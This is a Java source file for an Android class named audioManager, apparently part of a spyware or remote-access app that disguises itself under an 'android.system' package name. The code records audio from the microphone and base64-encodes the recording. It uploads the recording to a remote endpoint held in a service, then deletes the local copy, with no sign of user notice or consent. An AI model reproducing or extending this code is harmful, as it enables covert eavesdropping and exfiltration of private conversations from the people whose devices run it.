package oom.android.system.Managers;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;
import oom.android.system.Settings.TypeOpenFile;


public class audioManager {


    static String TAG = "audioManagerClass";

    Context context;

    static File audiofile = null;
    MediaRecorder mRecorder = null;
    boolean Online=false;

    public audioManager(Context context) {
        this.context = context;
    }


    public void startRecording(boolean Online){
        this.Online=Online;
        audiofile = MyService.OpenFile(TypeOpenFile.Record);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            mRecorder = new MyService().recorder;
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//VOICE_CALL Голосовой вызов uplink + нисходящий аудиоисточник
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mRecorder.setOutputFile(audiofile.getAbsolutePath());
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

            try {
                mRecorder.prepare();
                mRecorder.start();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void stopRecording(){
        if(mRecorder!=null){
            try{
                mRecorder.stop();
            }catch (IllegalStateException e){
            }
            mRecorder.release();
            if(Online) {
                if (audiofile.length() != 0 && audiofile.exists()) {
                    sendData(audiofile);
                }
                audiofile.delete();
            }
        }
    }

    private void sendData(File file) {

        if(file.length()>16000000)
            return;

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);

            String encodedAudio = "data:audio/mpeg;base64,"+Base64.encodeToString(data, Base64.DEFAULT);
            post(MyService.output_audio,encodedAudio);

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void post(String url,String data) {
        Runnable uploader = new HttpPoster(url,data);
        new Thread(uploader).start();
    }


}
